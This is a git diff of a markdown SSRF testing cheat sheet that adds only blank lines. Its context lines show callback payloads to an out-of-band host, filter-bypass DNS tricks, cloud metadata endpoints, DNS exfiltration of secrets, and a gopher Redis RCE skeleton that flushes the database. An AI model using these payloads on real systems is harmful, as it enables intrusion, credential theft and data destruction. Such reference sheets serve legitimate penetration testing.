@@ -18,6 +18,7 @@ interactsh-client -v
 ```
 
 Payload:
+
 ```
 url=http://<your>.oast.pro/
 url=//<your>.oast.pro
@@ -43,6 +44,7 @@ http://spoofed.burpcollaborator.net/   # DNS that resolves to 127.0.0.1
 ```
 
 Wildcard DNS services (map any IP to a hostname, useful for filter bypasses):
+
 ```
 # xip.io — DNS wildcard: <ip>.xip.io resolves to <ip>
 10.0.0.1.xip.io
@@ -54,6 +56,7 @@ app.10.0.0.1.nip.io
 ```
 
 Cloud metadata:
+
 - AWS: `http://169.254.169.254/latest/meta-data/` (IMDSv1) — see `Checklists/Cloud/aws.md`
 - GCP: `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google`
 - Azure: `http://169.254.169.254/metadata/` + `Metadata: true`
@@ -64,6 +67,7 @@ Cloud metadata:
 ## Blind SSRF amplification
 
 When response isn't returned:
+
 - Time-based — internal port open vs closed differs by TCP RST vs connect time.
 - Error-based — `http://127.0.0.1:22/` → "protocol mismatch" vs closed port → "connection refused".
 - DNS exfil — `http://<secret>.<your>.oast.pro/` if response data is echoed in headers.
@@ -94,6 +98,7 @@ Check `a1.nz` or Orange Tsai's Blackhat talk for the full matrix.
 - `php://filter/convert.base64-encode/resource=...` — PHP wrappers.
 
 Gopher Redis RCE skeleton:
+
 ```
 gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a...
 ```
